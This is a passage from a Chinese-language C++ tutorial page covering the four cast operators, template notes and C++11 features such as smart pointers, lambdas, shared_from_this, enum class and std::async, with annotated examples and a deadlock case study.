<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> a = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="built_in">static_cast</span>&lt;<span class="type">char</span>&gt;(a);               <span class="comment">// 正确，将char型数据转换成int型数据</span></span><br><span class="line"></span><br><span class="line"><span class="type">double</span> *c = <span class="keyword">new</span> <span class="type">double</span>;</span><br><span class="line"><span class="type">void</span> *d = <span class="built_in">static_cast</span>&lt;<span class="type">void</span>*&gt;(c);            <span class="comment">// 正确，将double指针转换成void指针</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> e = <span class="number">10</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> f = <span class="built_in">static_cast</span>&lt;<span class="type">const</span> <span class="type">int</span>&gt;(e);    <span class="comment">// 正确，将int型数据转换成const int型数据</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> g = <span class="number">20</span>;</span><br><span class="line"><span class="type">int</span> *h = <span class="built_in">static_cast</span>&lt;<span class="type">int</span>*&gt;(&amp;g);             <span class="comment">// 编译错误，static_cast不能转换掉g的const属性</span></span><br></pre></td></tr></table></figure>

<h3 id="const-cast"><a href="#const-cast" class="headerlink" title="const_cast"></a><code>const_cast</code></h3><ul>
<li>用于去除指针和引用的<code>const</code>或<code>volatile</code>属性</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> a = <span class="number">20</span>;</span><br><span class="line"><span class="type">int</span> *b = <span class="built_in">const_cast</span>&lt;<span class="type">int</span>*&gt;(&amp;a);      <span class="comment">// 去掉const常量const属性</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> a = <span class="number">20</span>;</span><br><span class="line"><span class="type">int</span> &amp;b = <span class="built_in">const_cast</span>&lt;<span class="type">int</span> &amp;&gt;(a);      <span class="comment">// 去掉const引用const属性</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *a = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="type">char</span> *b = <span class="built_in">const_cast</span>&lt;<span class="type">char</span> *&gt;(a);    <span class="comment">// 去掉const指针const属性</span></span><br></pre></td></tr></table></figure>

<h3 id="reinterpret-cast"><a href="#reinterpret-cast" class="headerlink" title="reinterpret_cast"></a><code>reinterpret_cast</code></h3><ul>
<li>主要用于不同指针类型的转换</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *a;</span><br><span class="line"><span class="type">char</span> *b = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">char</span> *&gt;(a);</span><br></pre></td></tr></table></figure>

<h4 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h4><ul>
<li><code>reinterpret_cast</code>是强制转换，不关心是否存在继承关系</li>
<li><code>static_cast</code>会根据具体类型进行一点转换，继承关系下，父类转子类时会做偏移</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> m_a;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> m_b;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> : <span class="keyword">public</span> A, <span class="keyword">public</span> B &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    C c;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p, %p, %p&quot;</span>, &amp;c, <span class="built_in">reinterpret_cast</span>&lt;B *&gt;(&amp;c), <span class="built_in">static_cast</span>&lt;B *&gt;(&amp;c));</span><br><span class="line">    <span class="comment">// 输出，前两个一样，后一个会做偏移</span></span><br><span class="line">    <span class="comment">// 0x7ffcc3b56340, 0x7ffcc3b56340, 0x7ffcc3b56344</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>reinterpret_cast</code>会造成不可预知的行为，比如下面，继承的兄弟类，强转成自己会造成调用的方法实际还是兄弟类的，而非自己的</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;I&#x27;m A&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>: <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">        <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;I&#x27;m B&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>: <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">        <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;I&#x27;m C&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    B b;</span><br><span class="line">    C *testc = <span class="built_in">reinterpret_cast</span>&lt;C*&gt;(&amp;b);</span><br><span class="line">    testc-&gt;<span class="built_in">print</span>();     <span class="comment">// I&#x27;m B，仅仅类型变了，虚指针的指向还是B，所以调用还是B</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="dynamic-cast"><a href="#dynamic-cast" class="headerlink" title="dynamic_cast"></a><code>dynamic_cast</code></h3><ul>
<li>主要适用于继承关系的转换，会检查转换的是否有效，无效将会返回nullptr</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;I&#x27;m A&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>: <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">        <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;I&#x27;m B&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>: <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">        <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;I&#x27;m C&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    B b;</span><br><span class="line">    b.<span class="built_in">print</span>();          <span class="comment">// I&#x27;m B</span></span><br><span class="line"></span><br><span class="line">    A *testa = <span class="built_in">dynamic_cast</span>&lt;A*&gt;(&amp;b);        <span class="comment">// B的指针转成A，是子类转基类，和static_cast一个效果，没问题</span></span><br><span class="line">    <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, testa == <span class="literal">nullptr</span>));     <span class="comment">// false</span></span><br><span class="line">    testa-&gt;<span class="built_in">print</span>();     <span class="comment">// I&#x27;m B</span></span><br><span class="line"></span><br><span class="line">    B *testb = <span class="built_in">dynamic_cast</span>&lt;B*&gt;(testa);     <span class="comment">// A的指针转成B，本质是B，所以没问题</span></span><br><span class="line">    testb-&gt;<span class="built_in">print</span>();     <span class="comment">// I&#x27;m B</span></span><br><span class="line"></span><br><span class="line">    C *testc = <span class="built_in">dynamic_cast</span>&lt;C*&gt;(testa);     <span class="comment">// A的指针转成C，但本质还是B，所以这里是nullptr</span></span><br><span class="line">    <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, testc == <span class="literal">nullptr</span>));     <span class="comment">// true</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="7-模板"><a href="#7-模板" class="headerlink" title="7. 模板"></a>7. 模板</h2><h3 id="7-1-模板类"><a href="#7-1-模板类" class="headerlink" title="7.1. 模板类"></a>7.1. 模板类</h3><h4 id="1-静态成员函数"><a href="#1-静态成员函数" class="headerlink" title="1) 静态成员函数"></a>1) 静态成员函数</h4><ul>
<li>C++模板类中的静态成员函数需要在头文件里定义，否则会出现 LNK2019，找不到所定义的函数。也就是说对于静态函数，C++的编译器默认是不会查找相应的源文件的。</li>
</ul>
<h3 id="7-2-模板类型"><a href="#7-2-模板类型" class="headerlink" title="7.2. 模板类型"></a>7.2. 模板类型</h3><h4 id="1-获取类型名"><a href="#1-获取类型名" class="headerlink" title="1) 获取类型名"></a>1) 获取类型名</h4><ul>
<li>获取的是类型在二进制中的符号名，不是类型在代码中的名字</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">std::cout &lt;&lt; <span class="built_in">typeid</span>(_Tp).<span class="built_in">name</span>() &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure>

<h2 id="8-C-11-新特性"><a href="#8-C-11-新特性" class="headerlink" title="8. C++11 新特性"></a>8. C++11 新特性</h2><h3 id="8-1-智能指针"><a href="#8-1-智能指针" class="headerlink" title="8.1. 智能指针"></a>8.1. 智能指针</h3><h4 id="1-weak-ptr-弱指针"><a href="#1-weak-ptr-弱指针" class="headerlink" title="1) weak_ptr 弱指针"></a>1) weak_ptr 弱指针</h4><p>弱指针判断指向的对象是否存在只能通过<code>lock()</code>方法，如果不为空则返回强引用指针，否则返回<code>nullptr</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">std::weak_ptr&lt;type&gt; tmp = a;</span><br><span class="line"><span class="keyword">if</span> (tmp.<span class="built_in">lock</span>() == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    <span class="comment">//指向地址不存在</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//指向地址存在</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-shared-ptr-共享指针"><a href="#2-shared-ptr-共享指针" class="headerlink" title="2) shared_ptr 共享指针"></a>2) shared_ptr 共享指针</h4><h5 id="1-方法"><a href="#1-方法" class="headerlink" title="(1) 方法"></a>(1) 方法</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">std::shared_ptr&lt;<span class="type">int</span>&gt; <span class="title">p1</span><span class="params">(<span class="keyword">new</span> <span class="type">int</span>(<span class="number">10</span>))</span></span>;</span><br><span class="line">p1.<span class="built_in">reset</span>();     <span class="comment">// 会将p1赋值成nullptr</span></span><br></pre></td></tr></table></figure>

<h5 id="2-类型转换"><a href="#2-类型转换" class="headerlink" title="(2) 类型转换"></a>(2) 类型转换</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">std::shared_ptr&lt;<span class="type">int</span>&gt; <span class="title">p1</span><span class="params">(<span class="keyword">new</span> <span class="type">int</span>(<span class="number">10</span>))</span></span>;</span><br><span class="line">    std::shared_ptr&lt;<span class="type">void</span>&gt; p2 = p1;</span><br><span class="line">    std::shared_ptr&lt;<span class="type">int</span>&gt; p3 = std::<span class="built_in">static_pointer_cast</span>&lt;<span class="type">int</span>&gt;(p2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="3-源码分析和注意事项"><a href="#3-源码分析和注意事项" class="headerlink" title="(3) 源码分析和注意事项"></a>(3) 源码分析和注意事项</h5><p><a href="/bookPages/docs/c++/shared_ptr/">shared_ptr</a></p>
<h4 id="3-unique-ptr-唯一持有的指针"><a href="#3-unique-ptr-唯一持有的指针" class="headerlink" title="3) unique_ptr 唯一持有的指针"></a>3) unique_ptr 唯一持有的指针</h4><ul>
<li><code>unique_ptr</code>不允许拷贝</li>
</ul>
<h5 id="1-转换"><a href="#1-转换" class="headerlink" title="(1) 转换"></a>(1) 转换</h5><ul>
<li><code>unique_ptr</code>释放所有权可以转为<code>shared_ptr</code></li>
<li>但是<code>shared_ptr</code>不能转成<code>unique_ptr</code></li>
</ul>
<h3 id="8-2-Lambda-函数"><a href="#8-2-Lambda-函数" class="headerlink" title="8.2. Lambda 函数"></a>8.2. Lambda 函数</h3><h4 id="1-语法"><a href="#1-语法" class="headerlink" title="1) 语法"></a>1) 语法</h4><p><strong>简单示例</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 不带返回值</span></span><br><span class="line"><span class="type">int</span> sum;</span><br><span class="line"><span class="keyword">auto</span> testFunc = [&amp;sum](<span class="type">int</span> x, <span class="type">int</span> y) &#123;</span><br><span class="line">    sum = x + y;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 带返回值</span></span><br><span class="line"><span class="keyword">auto</span> testFunc1 = [sum](<span class="type">int</span> x, <span class="type">int</span> y) -&gt; <span class="type">int</span> &#123;</span><br><span class="line">    sum = x + y;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong><code>[]</code>定义函数外变量的引用行为</strong></p>
<ul>
<li><code>[&amp;sum]</code>: 仅使用引用传递外部 sum 变量</li>
<li><code>[&amp;]</code>: 使用引用传递外部变量</li>
<li><code>[sum]</code>: 仅使用值传递外部 sum 变量</li>
<li><code>[=]</code>: 仅使用值捕获外部变量</li>
<li><code>[=, &amp;sum]</code>: 除 sum 外其他都是值传递</li>
<li><code>[&amp;, sum]</code>: 除 sum 外其他都是引用传递</li>
<li><code>[&amp;, sum, this]</code>: this 仅能值传递，并且仅在非静态函数中才能传递，Lambda 函数和它所在函数具有相同的属性（public、private）</li>
<li>值捕获只在定义当时的值会传递，如果定义后更改了捕获的变量，不影响 Lambda 里面使用的值</li>
</ul>
<p><strong>this传递安全写法</strong></p>
<ul>
<li>根据能否锁定ptr判断父类是否存在</li>
<li>如果存在，this指针才有效，相当于lambda运行在类环境中，可以直接调用类成员函数</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> : std::enable_shared_from_this&lt;A&gt; &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        std::weak_ptr&lt;A&gt; weak_ptr = <span class="built_in">shared_from_this</span>();</span><br><span class="line">        <span class="keyword">auto</span> test_func = [weak_ptr, <span class="keyword">this</span>]() &#123;</span><br><span class="line">            <span class="keyword">auto</span> self = weak_ptr.<span class="built_in">lock</span>();</span><br><span class="line">            <span class="keyword">if</span> (!self) <span class="keyword">return</span>;</span><br><span class="line">            <span class="built_in">funcB</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">funcB</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;funcB&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-实现"><a href="#2-实现" class="headerlink" title="2) 实现"></a>2) 实现</h4><p>编译器对lambda表达式在底层是创建了一个类，重载了<code>()</code>运算符</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">lambda_xxx</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(X &amp;elem)</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">        elem.<span class="built_in">op</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>对于捕获的变量，lambda类在创建的时候通过成员函数保存了需要捕获的变量</p>
<h3 id="8-3-原生字符串"><a href="#8-3-原生字符串" class="headerlink" title="8.3. 原生字符串"></a>8.3. 原生字符串</h3><ul>
<li>字符串类似格式化的 json，放到代码里面，需要将换行和双引号转义，c++11 支持原生字符串，不需要进行转义，使用此类型格式<code>R&quot;()&quot;</code></li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">std::string test = <span class="string">R&quot;(&#123;</span></span><br><span class="line"><span class="string">    &quot;a&quot;: &quot;b&quot;,</span></span><br><span class="line"><span class="string">    &quot;c&quot;: 1,</span></span><br><span class="line"><span class="string">    &quot;d&quot;: &#123;</span></span><br><span class="line"><span class="string">        &quot;e&quot;: [2]</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;)&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="8-4-shared-from-this"><a href="#8-4-shared-from-this" class="headerlink" title="8.4. shared_from_this"></a>8.4. shared_from_this</h3><ul>
<li>使用<code>shared_from_this()</code>可以将当前类的 this 指针转成 shared</li>
<li>需要继承一个模板类<code>std::enable_shared_from_this&lt;T&gt;</code></li>
<li>使用<code>share_ptr&lt;A&gt;(this)</code>会导致二次析构，因为不会增加引用计数</li>
<li>注意在<code>void func1() const</code>下只能生成<code>std::shared_ptr&lt;const A&gt;</code>的指针</li>
<li>必须类本身存在<code>shared_ptr</code>才可以调用<code>shared_from_this()</code>，即外部持有类必须用共享指针进行持有</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> : <span class="keyword">public</span> std::enable_shared_from_this&lt;A&gt; &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        std::shared_ptr&lt;A&gt; p = <span class="built_in">shared_from_this</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">func1</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 这里只能生成const A的共享指针，没有A的共享指针</span></span><br><span class="line">        std::shared_ptr&lt;<span class="type">const</span> A&gt; p = <span class="built_in">shared_from_this</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    A a;                                <span class="comment">// 这样构造，上面的shared_from_this会抛异常</span></span><br><span class="line">    <span class="keyword">auto</span> pA = std::<span class="built_in">make_shared</span>&lt;A&gt;();    <span class="comment">// 这样才能正常调用shared_from_this</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="8-5-enum-class-强类型枚举"><a href="#8-5-enum-class-强类型枚举" class="headerlink" title="8.5. enum class 强类型枚举"></a>8.5. enum class 强类型枚举</h3><ul>
<li>就将枚举看成一个类，可以提前声明</li>
<li>强类型，不允许隐式类型转换</li>
<li>使用必须加类型前缀</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 提前声明</span></span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">TestType</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">TestType</span> &#123;</span><br><span class="line">    HHHHH,</span><br><span class="line">    ASSSS</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">func</span><span class="params">(TestType type)</span> </span>&#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="built_in">func</span>(a);                <span class="comment">// 编译报错</span></span><br><span class="line">    TestType a1 = HHHHH;    <span class="comment">// 编译报错，未定义</span></span><br><span class="line">    TestType a2 = TestType::HHHHH;</span><br><span class="line">    <span class="built_in">func</span>(a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="8-6-future和promise"><a href="#8-6-future和promise" class="headerlink" title="8.6. future和promise"></a>8.6. future和promise</h3><p>见<a href="/blogs/2020-08-01-threadPool/#-future-%E6%9C%AA%E6%9D%A5%E5%80%BC%E8%8E%B7%E5%8F%96">future 未来值获取</a></p>
<h4 id="踩坑记"><a href="#踩坑记" class="headerlink" title="踩坑记"></a>踩坑记</h4><h5 id="1-future和shared-from-this造成的崩溃"><a href="#1-future和shared-from-this造成的崩溃" class="headerlink" title="(1) future和shared_from_this造成的崩溃"></a>(1) future和<code>shared_from_this</code>造成的崩溃</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> : <span class="keyword">public</span> enable_shared_from_this&lt;Test&gt; &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Test</span>() : <span class="built_in">m_work</span>(m_ioContext) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Test()&quot;</span> &lt;&lt; endl;</span><br><span class="line">        m_future = <span class="built_in">async</span>(launch::async, [<span class="keyword">this</span>]() &#123; m_ioContext.<span class="built_in">run</span>(); &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">Test</span>() &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;~Test()&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">if</span> (!m_ioContext.<span class="built_in">stopped</span>()) &#123;</span><br><span class="line">            m_ioContext.<span class="built_in">stop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (m_future.<span class="built_in">valid</span>()) &#123;</span><br><span class="line">            m_future.<span class="built_in">wait</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">post</span><span class="params">(std::function&lt;<span class="type">void</span>()&gt; func)</span> </span>&#123;</span><br><span class="line">        std::weak_ptr&lt;Test&gt; weakPtr = <span class="built_in">shared_from_this</span>();</span><br><span class="line">        m_ioContext.<span class="built_in">post</span>([func, weakPtr, <span class="keyword">this</span>] &#123;</span><br><span class="line">            <span class="keyword">auto</span> self = weakPtr.<span class="built_in">lock</span>();</span><br><span class="line">            <span class="keyword">if</span> (self == <span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line">            <span class="built_in">func</span>();</span><br><span class="line">            <span class="comment">// 睡眠100ms，构造self为最后一个引用计数</span></span><br><span class="line">            this_thread::<span class="built_in">sleep_for</span>(chrono::<span class="built_in">milliseconds</span>(<span class="number">100</span>));</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    future&lt;<span class="type">void</span>&gt; m_future;</span><br><span class="line">    boost::asio::io_context m_ioContext;</span><br><span class="line">    boost::asio::io_context::work m_work;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::shared_ptr&lt;Test&gt; pTest = std::<span class="built_in">make_shared</span>&lt;Test&gt;();</span><br><span class="line"></span><br><span class="line">    std::promise&lt;<span class="type">void</span>&gt; p;</span><br><span class="line">    <span class="keyword">auto</span> taskFunc = [&amp;p]() &#123;</span><br><span class="line">        <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;task run&quot;</span>));</span><br><span class="line">        p.<span class="built_in">set_value</span>();</span><br><span class="line">    &#125;;</span><br><span class="line">    pTest-&gt;<span class="built_in">post</span>(taskFunc);</span><br><span class="line"></span><br><span class="line">    p.<span class="built_in">get_future</span>().<span class="built_in">wait</span>();</span><br><span class="line">    <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;taskDone&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argC, <span class="type">char</span> *argV[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">func</span>();</span><br><span class="line">    <span class="comment">// 这里造成还在继续跑的情况，防止因为进程退出而吃掉异常</span></span><br><span class="line">    this_thread::<span class="built_in">sleep_for</span>(chrono::<span class="built_in">milliseconds</span>(<span class="number">200</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>上面代码在<code>func()</code>调用退出后，函数内的<code>pTest</code>会释放引用计数，但是<code>Test</code>的<code>post</code>里面的任务函数使用了<code>weakPtr.lock()</code>，将<code>Test</code>的引用计数加1而成为最后一个引用<code>Test</code>的指针</li>
<li>在最后任务函数退出时，引用计数清0，调用析构函数。此时发现析构函数调用线程为类本身的工作线程，工作线程中调用<code>m_future.wait()</code>会抛出<code>Resource deadlock avoided</code>的异常，即死锁</li>
</ul>
<h3 id="8-7-async-线程的封装类"><a href="#8-7-async-线程的封装类" class="headerlink" title="8.7. async 线程的封装类"></a>8.7. async 线程的封装类</h3><ul>
<li>存在thread、promise和future，还要async干嘛</li>
<li>由于用起来太麻烦，async将这三者结合了一下，更加方便调用</li>
</ul>
<h4 id="1-参数"><a href="#1-参数" class="headerlink" title="1) 参数"></a>1) 参数</h4><ul>
<li>第一个参数为模式<ul>
<li><code>std::launch::async</code>: 调用async时创建线程</li>
<li><code>std::launch::deferred</code>: 返回的future调用<code>get</code>和<code>wait</code>时才创建线程</li>
</ul>
</li>
<li>第二个参数为函数指针，可以使用lambda表达式</li>
</ul>
<h4 id="2-返回值"><a href="#2-返回值" class="headerlink" title="2) 返回值"></a>2) 返回值</h4><ul>
<li>返回future变量，需要使用变量接受，因为future在析构时会自动调用<code>wait()</code>，如果没有接受返回的future，相当用起了一个线程，还等这个线程退出</li>
<li>返回的future为第二个参数的函数返回值类型</li>
</ul>
<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::future&lt;<span class="type">int</span>&gt; f1 = std::<span class="built_in">async</span>(std::launch::async, []() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, f1.<span class="built_in">get</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

